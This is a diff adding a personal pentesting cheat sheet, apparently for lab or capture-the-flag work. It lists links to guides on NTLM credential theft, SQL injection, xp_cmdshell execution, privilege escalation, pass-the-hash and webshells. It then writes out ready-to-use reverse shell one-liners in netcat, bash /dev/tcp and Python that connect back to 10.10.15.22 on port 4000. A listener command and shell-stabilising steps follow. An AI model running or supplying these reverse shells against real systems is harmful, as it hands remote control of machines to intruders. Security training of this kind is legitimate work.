@@ -1,2 +1,76 @@
 # Resources
-### LINKS
+A collection of links and payloads I stored for quick access
+# LINKS:
+- [**NTLM Theft**](https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds)
+- [**Server SideTemplate Injection Payloads**](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
+- [**Jenkins Pentesting**](https://book.hacktricks.xyz/cloud-security/jenkins#code-execution)
+- [**SecLists**](https://github.com/danielmiessler/SecLists)
+- [**Payloads Of All Things**](https://github.com/swisskyrepo/PayloadsAllTheThings)
+- [**MSSQL Pentesting**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
+- [**MSSQL Injection Cheatsheat**](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
+- [**XP_cmdshell cheatsheat**](https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-xp_cmdshell/)
+- [**Impacket mssqlclient Reverse Shell**](https://rioasmara.com/2020/05/30/impacket-mssqlclient-reverse-shell/)
+- [**Windows Local Privillage Escalation**](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#krbrelayup)
+-  [**Juicy Potato Exploit**](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato)
+-  [**Pass The Hash**](https://www.netwrix.com/pass_the_hash_attack_explained.html)
+-  [**HashCat Beginner Guide**](https://resources.infosecinstitute.com/topic/hashcat-tutorial-beginners/)
+-  [**Hash Analyzer**](https://www.tunnelsup.com/hash-analyzer/)
+-  [**Zip and rar Cracking with john**](https://dfir.science/2014/07/how-to-cracking-zip-and-rar-protected.html)
+-  [**Reverse Shell Generator**](https://www.revshells.com/)
+-  [**GTFO bins**](https://gtfobins.github.io/)
+-  [**Webshells**](https://github.com/BlackArch/webshells)
+
+# Payloads:
+## Local Webserver
+
+### Python
+
+```python
+python -m SimpleHTTPServer
+```
+
+```python
+python3 -m http.server
+```
+
+### PHP
+```php
+php -S 0.0.0.0:8000
+```
+
+## Shells
+
+### Set Listener 
+```bash
+nc -lnvp 4000
+```
+
+### [Reverse Shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+#### netcat
+```bash
+nc -e /bin/sh 10.10.15.22 4000
+```
+
+#### Bash
+```bash
+bash -i >& /dev/tcp/10.10.15.22/4000 0>&1
+```
+#### Python
+```python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.22",4000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+### Interactive Shell
+
+#### Bash 
+```python
+python(3) -c 'import pty; pty.spawn("/bin/bash")'
+```
+```cmd
+Ctrl-Z
+```
+```cmd
+stty raw -echo
+```
+```
+fg
+```
